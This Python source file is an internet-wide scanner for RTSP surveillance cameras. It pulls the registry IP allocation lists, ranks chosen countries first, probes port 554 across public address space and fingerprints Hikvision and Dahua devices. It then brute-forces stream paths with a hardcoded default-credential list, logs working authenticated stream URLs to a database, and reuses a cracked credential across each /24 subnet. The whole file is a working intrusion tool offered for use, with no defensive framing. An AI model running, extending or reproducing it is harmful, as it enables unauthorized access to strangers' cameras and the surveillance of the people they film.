import asyncio
import ipaddress
import sqlite3
import time
import requests
import random
import math
import base64
import socket
import re
import hashlib
from datetime import datetime
import os
import subprocess
from concurrent.futures import ThreadPoolExecutor

try:
    import aiosqlite
    AIOSQLITE_OK = True
except ImportError:
    AIOSQLITE_OK = False

try:
    import av
    AV_OK = True
except ImportError:
    AV_OK = False

# --- Config v8.8 (Quantum-Jump Engine) ---
RTSP_PORTS = [554, 8554, 5554, 10554]
MAX_WORKERS = 180 
CONNECT_TIMEOUT = 3.5 
DB_PATH = "rtsp_scan.db"
TARGETS_FILE = "targets.txt"
BATCH_COMMIT_SIZE = 100

FEEDS = {
    "ARIN":    "https://ftp.arin.net/pub/stats/arin/delegated-arin-extended-latest",
    "RIPE":    "https://ftp.ripe.net/pub/stats/ripencc/delegated-ripencc-extended-latest",
    "AFRINIC": "https://ftp.afrinic.net/pub/stats/afrinic/delegated-afrinic-extended-latest",
    "APNIC":   "https://ftp.apnic.net/stats/apnic/delegated-apnic-extended-latest",
    "LACNIC":  "https://ftp.lacnic.net/pub/stats/lacnic/delegated-lacnic-extended-latest",
}

HOT_CC = ["CN", "KR", "JP", "TW", "RU", "UA", "TR", "IN", "IR"]
HOT_NETWORKS = ["116.0.0.0/8", "222.0.0.0/8", "114.0.0.0/8", "121.0.0.0/8", "185.0.0.0/8", "109.0.0.0/8", "218.0.0.0/8"]

VENDOR_MAP = {
    "relay_server": ["/live", "/stream", "/0", "/1", "/1/1", "/live/0/1", "/mpeg4", "/h264"],
    "hikvision": ["/Streaming/Channels/101", "/Streaming/Channels/1", "/h264/ch1/main/av_stream", "/ISAPI/streaming/channels/101"],
    "dahua": ["/cam/realmonitor?channel=1&subtype=0", "/cam/realmonitor?channel=1&subtype=1", "/live", "/h264"],
    "media_receiver": ["/1/1", "/1/2", "/2/1", "/live/0/1", "/cam/realmonitor?channel=1"], 
    "generic": ["", "/live", "/stream", "/video", "/cam", "/11", "/12", "/ch01.264"]
}

CREDS = [
    ("admin", "admin"), ("admin", "12345"), ("admin", ""), ("root", "root"), 
    ("admin", "123456"), ("user", "user"), ("admin", "1111111"), ("admin", "888888"),
    ("admin", "password"), ("admin", "12345678"), ("admin", "9999")
]

class ScannerEngine:
    def __init__(self, db_path=DB_PATH):
        self.db_path = db_path
        self.max_workers = MAX_WORKERS
        self.write_queue = asyncio.Queue(maxsize=50000)
        self.listeners = set()
        self.is_running = False
        self.executor = ThreadPoolExecutor(max_workers=80)
        self.confirmed_count = 0
        self.scanned_count = 0
        self.count_lock = asyncio.Lock()
        self.skip_requested = False
        self.last_skipped_master = None
        self.current_network = "Awaiting..."
        self.last_status = "System Standby"
        self.current_region = "None"
        
        # v8.8 Dynamic Injection
        self.manual_queue = asyncio.Queue()
        self.swarm_memory = {}
        self.swarm_lock = asyncio.Lock()

    def inject_high_priority(self, target):
        self.manual_queue.put_nowait(target)
        self.skip_requested = True

    def init_db_sync(self):
        con = sqlite3.connect(self.db_path)
        con.execute("PRAGMA journal_mode=WAL")
        con.execute("""CREATE TABLE IF NOT EXISTS results (
            ip TEXT PRIMARY KEY, rir TEXT, cc TEXT, status TEXT, banner TEXT, vendor TEXT,
            working_url TEXT, codec TEXT, resolution TEXT, fps INTEGER, scanned_at TEXT,
            bookmarked INTEGER DEFAULT 0
        )""")
        cols = [row[1] for row in con.execute("PRAGMA table_info(results)").fetchall()]
        for c in ["codec", "resolution", "fps", "vendor", "bookmarked"]:
            if c not in cols:
                try: con.execute(f"ALTER TABLE results ADD COLUMN {c} {'INTEGER' if c in ['fps', 'bookmarked'] else 'TEXT'}")
                except: pass
        con.commit(); con.close()

    async def broadcast(self, event):
        if event["event"] == "status": self.last_status = event["msg"]
        if event["event"] == "network": 
            self.current_network = event["net"]
            self.current_region = f"{event['rir']} | {event['cc']}"
        for q in list(self.listeners):
            try: q.put_nowait(event)
            except: self.listeners.discard(q)

    def is_public_ip(self, ip_str):
        try:
            ip_obj = ipaddress.ip_address(ip_str)
            return not (ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_multicast or ip_obj.is_reserved or str(ip_obj).startswith("0."))
        except: return False

    def _get_subnet_24(self, ip_str):
        try: return str(ipaddress.ip_network(f"{ip_str}/24", strict=False))
        except: return None

    def _make_digest_auth(self, user, passwd, method, uri, realm, nonce):
        ha1 = hashlib.md5(f"{user}:{realm}:{passwd}".encode()).hexdigest()
        ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
        response = hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
        return (f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="{uri}", response="{response}"')

    def _build_rtsp_req(self, method, url, seq, user="", passwd="", auth_header=None):
        lines = [f"{method} {url} RTSP/1.0", f"CSeq: {seq}", "User-Agent: IFAC-QuantumHunter/8.8", "Accept: application/sdp"]
        if auth_header: lines.append(f"Authorization: {auth_header}")
        elif user and "user=" not in url.lower():
            cred = base64.b64encode(f"{user}:{passwd}".encode()).decode()
            lines.append(f"Authorization: Basic {cred}")
        lines += ["", ""]
        return "\r\n".join(lines).encode()

    def av_validate(self, url):
        if AV_OK:
            opts = {"rtsp_transport": "tcp", "stimeout": "4000000", "analyzeduration": "1000000"}
            try:
                with av.open(url, options=opts, timeout=7.5) as container:
                    v = next((s for s in container.streams if s.type == "video"), None)
                    if v: return {"codec": (v.codec_context.name or "??").upper(), "res": f"{v.codec_context.width}x{v.codec_context.height}", "fps": int(v.average_rate or 0)}
            except: pass
        try:
            cmd = ["ffprobe", "-v", "error", "-select_streams", "v:0", "-show_entries", "stream=codec_name,width,height,avg_frame_rate", "-of", "csv=p=0", url]
            out = subprocess.check_output(cmd, timeout=8).decode().strip().split(",")
            if len(out) >= 3:
                fps = 0
                if "/" in out[3]: 
                    a, b = map(float, out[3].split("/"))
                    fps = int(a/b) if b > 0 else 0
                return {"codec": out[0].upper(), "res": f"{out[1]}x{out[2]}", "fps": fps}
        except: pass
        return None

    def _extract_sdp_paths(self, body, ip, port):
        paths = []
        for m in re.finditer(r'a=control:(rtsp://[^\s\r\n]+)', body, re.I):
            paths.append(m.group(1).replace(f"rtsp://{ip}:{port}", "").replace(f"rtsp://{ip}", ""))
        for m in re.finditer(r'a=control:([^\s\r\n]+)', body, re.I):
            val = m.group(1).strip()
            if not val.startswith('rtsp://') and val != '*':
                paths.append(val if val.startswith('/') else f"/{val}")
        return list(dict.fromkeys(paths))

    async def _try_specific_cred(self, ip, port, path, u, p, rir, cc, banner, vendor):
        f_path = path.replace("{u}", u).replace("{p}", p)
        url = f"rtsp://{ip}:{port}{f_path}" if "user=" in path.lower() else (f"rtsp://{u}:{p}@{ip}:{port}{f_path}" if u else f"rtsp://{ip}:{port}{f_path}")
        meta = await asyncio.get_running_loop().run_in_executor(self.executor, self.av_validate, url)
        if meta:
            await self.report_success(ip, url, rir, cc, banner, vendor, meta)
            return True
        return False

    async def run_deep_probe(self, ip, port, rir, cc, rtsp_banner, semaphore):
        success = False
        async with semaphore:
            try:
                vendor = "generic"
                b_low = rtsp_banner.lower()
                is_relay = "RECORD" in rtsp_banner.upper() and "PAUSE" not in rtsp_banner.upper()
                if is_relay: vendor = "relay_server"
                elif "announce" in rtsp_banner.upper(): vendor = "media_receiver"
                elif "hikvision" in b_low or re.search(r'realm="Login to [a-f0-9]{32}"', rtsp_banner): vendor = "hikvision"
                elif "dahua" in b_low: vendor = "dahua"
                
                # Swarm Memory Check
                subnet = self._get_subnet_24(ip)
                async with self.swarm_lock:
                    golden_key = self.swarm_memory.get(subnet)
                if golden_key:
                    if await self._try_specific_cred(ip, port, golden_key[0], golden_key[1], golden_key[2], rir, cc, rtsp_banner, f"{vendor} (Swarm)"):
                        success = True; return

                # SDP Discovery
                try:
                    reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2.5)
                    writer.write(self._build_rtsp_req("DESCRIBE", f"rtsp://{ip}:{port}/", 1))
                    await writer.drain()
                    data = await asyncio.wait_for(reader.read(4096), timeout=2.5)
                    writer.close(); await writer.wait_closed()
                    if b"200 OK" in data:
                        for sp in self._extract_sdp_paths(data.decode("utf-8", errors="ignore"), ip, port):
                            if await self._try_path_with_creds(ip, port, sp, rir, cc, rtsp_banner, f"{vendor} (SDP)"):
                                success = True; return
                except: pass

                test_paths = list(dict.fromkeys(VENDOR_MAP.get(vendor, []) + VENDOR_MAP["generic"]))
                for path in test_paths:
                    if not self.is_running: return
                    if await self._try_path_with_creds(ip, port, path, rir, cc, rtsp_banner, vendor):
                        success = True; return
            except Exception as e: print(f"[PROBE ERROR] {ip}: {e}")
            finally:
                if not success: await self.broadcast({"event": "failed_probe", "ip": ip})

    async def _try_path_with_creds(self, ip, port, path, rir, cc, banner, vendor):
        for user, pwd in [(None, None)] + CREDS:
            u, p = (user or "", pwd or "")
            f_path = path.replace("{u}", u).replace("{p}", p)
            url = f"rtsp://{ip}:{port}{f_path}" if "user=" in path.lower() else (f"rtsp://{u}:{p}@{ip}:{port}{f_path}" if u else f"rtsp://{ip}:{port}{f_path}")
            meta = await asyncio.get_running_loop().run_in_executor(self.executor, self.av_validate, url)
            if meta:
                subnet = self._get_subnet_24(ip)
                if subnet:
                    async with self.swarm_lock: self.swarm_memory[subnet] = (path, u, p)
                await self.report_success(ip, url, rir, cc, banner, vendor, meta)
                return True
        return False

    async def report_success(self, ip, url, rir, cc, banner, vendor, meta):
        async with self.count_lock: self.confirmed_count += 1
        print(f"[HIT] {ip} | {vendor} | {meta['res']}") 
        await self.broadcast({"event": "confirmed", "ip": ip, "url": url, "rir": rir, "cc": cc, "banner": banner, "vendor": vendor, **meta})
        await self.write_queue.put({"ip": ip, "working_url": url, "vendor": vendor, "update": True, **meta})

    async def probe_ip(self, ip, port, semaphore, rir, cc):
        async with semaphore:
            ts = datetime.utcnow().isoformat()
            try:
                reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=CONNECT_TIMEOUT)
                writer.write(self._build_rtsp_req("OPTIONS", f"rtsp://{ip}:{port}/", 1))
                await writer.drain()
                data = await asyncio.wait_for(reader.read(2048), timeout=CONNECT_TIMEOUT)
                banner = data.decode("utf-8", errors="replace").strip()
                writer.close(); await writer.wait_closed()
                if "RTSP/1.0" in banner:
                    await self.broadcast({"event": "found_hw", "ip": ip, "rir": rir, "cc": cc, "banner": banner[:250]})
                    asyncio.create_task(self.run_deep_probe(ip, port, rir, cc, banner, semaphore))
                    return {"ip": ip, "rir": rir, "cc": cc, "status": "open", "banner": banner[:400], "ts": ts}
            except: pass
            return {"ip": ip, "rir": rir, "cc": cc, "status": "closed", "ts": ts}

    async def db_writer(self):
        if not AIOSQLITE_OK: return
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute("PRAGMA journal_mode=WAL")
            while True:
                item = await self.write_queue.get()
                if item is None: break
                try:
                    if item.get("update"):
                        await db.execute("UPDATE results SET working_url = ?, vendor = ?, codec = ?, resolution = ?, fps = ? WHERE ip = ?", 
                                    (item["working_url"], item["vendor"], item["codec"], item.get("res"), item["fps"], item["ip"]))
                    else:
                        await db.execute("INSERT OR REPLACE INTO results (ip,rir,cc,status,banner,scanned_at) VALUES(?,?,?,?,?,?)", 
                                    (item["ip"], item["rir"], item["cc"], item["status"], item.get("banner"), item["ts"]))
                    await db.commit()
                except: pass

    def _fragment_network(self, net_str, target_prefix=16):
        try:
            net = ipaddress.ip_network(net_str, False)
            if net.prefixlen >= target_prefix: return [str(net)]
            return [str(s) for s in net.subnets(new_prefix=target_prefix)]
        except: return []

    async def run_scan(self):
        if self.is_running: return
        self.is_running = True
        try:
            self.init_db_sync()
            loop = asyncio.get_running_loop()
            semaphore = asyncio.Semaphore(self.max_workers)
            writer_task = asyncio.create_task(self.db_writer())
            
            async def watchdog():
                while self.is_running:
                    await self.broadcast({"event": "status", "msg": f"Pulse: {self.scanned_count} audited..."})
                    await asyncio.sleep(15)
            asyncio.create_task(watchdog())

            raw_networks = []
            for rir, url in FEEDS.items():
                await self.broadcast({"event": "status", "msg": f"Syncing {rir}..."})
                try:
                    r = await loop.run_in_executor(None, lambda u=url: requests.get(u, timeout=12))
                    for line in r.text.splitlines():
                        if "|ipv4|" not in line: continue
                        p = line.split("|")
                        if len(p) < 7 or p[3] == "*" or not self.is_public_ip(p[3]): continue
                        raw_networks.append((10 if p[1] in HOT_CC else 1, p[0], p[1], f"{p[3]}/{32-int(math.log2(int(p[4])))}", f"{p[3]}/{32-int(math.log2(int(p[4])))}"))
                except: continue

            fragmented_targets = []
            for prio, rir, cc, net_str, master in raw_networks:
                for f in self._fragment_network(net_str): fragmented_targets.append((prio, rir, cc, f, master))
            
            random.shuffle(fragmented_targets); fragmented_targets.sort(key=lambda x: x[0], reverse=True)
            await self.broadcast({"event": "status", "msg": "🚀 v8.8 Quantum-Jump Online."})

            while self.is_running:
                # 1. PRIORIDADE: MANUAL INJECT
                while not self.manual_queue.empty():
                    m_target = await self.manual_queue.get()
                    await self._scan_single_net(m_target, "MANUAL", "USER", m_target, semaphore)

                # 2. LOOP GLOBAL
                for _, rir, cc, net_str, master in fragmented_targets:
                    if not self.is_running or not self.manual_queue.empty(): break
                    if self.last_skipped_master == master: continue
                    await self._scan_single_net(net_str, rir, cc, master, semaphore)
                
                if self.manual_queue.empty(): break

            await self.write_queue.put(None); await writer_task
        finally: self.is_running = False

    async def _scan_single_net(self, net_str, rir, cc, master, semaphore):
        await self.broadcast({"event": "network", "net": str(net_str), "rir": rir, "cc": cc})
        with sqlite3.connect(self.db_path) as con:
            skip_ips = {row[0] for row in con.execute("SELECT ip FROM results WHERE status IN ('open', 'closed')")}
        try:
            network = ipaddress.ip_network(net_str, False)
            hosts = list(network.hosts()); random.shuffle(hosts)
            for ip in hosts:
                if not self.is_running or self.skip_requested or not self.manual_queue.empty():
                    self.skip_requested = False; self.last_skipped_master = master; return
                ip_s = str(ip)
                if ip_s in skip_ips: continue
                async def worker(target_ip, r, c):
                    res = await self.probe_ip(target_ip, 554, semaphore, r, c)
                    await self.write_queue.put(res)
                    async with self.count_lock: self.scanned_count += 1
                    if self.scanned_count % 50 == 0: await self.broadcast({"event": "progress", "scanned": self.scanned_count, "confirmed": self.confirmed_count})
                asyncio.create_task(worker(ip_s, rir, cc))
                while len(asyncio.all_tasks()) > self.max_workers * 2: await asyncio.sleep(0.01)
        except: pass

    async def event_generator(self):
        q = asyncio.Queue(); self.listeners.add(q)
        try:
            yield {"event": "status", "msg": "Neural Link v8.8 Ready."}
            yield {"event": "progress", "scanned": self.scanned_count, "confirmed": self.confirmed_count}
            while True:
                try: yield await asyncio.wait_for(q.get(), timeout=15.0)
                except asyncio.TimeoutError: yield {"event": "ping"}
        finally: self.listeners.discard(q)

if __name__ == "__main__":
    asyncio.run(ScannerEngine().run_scan())
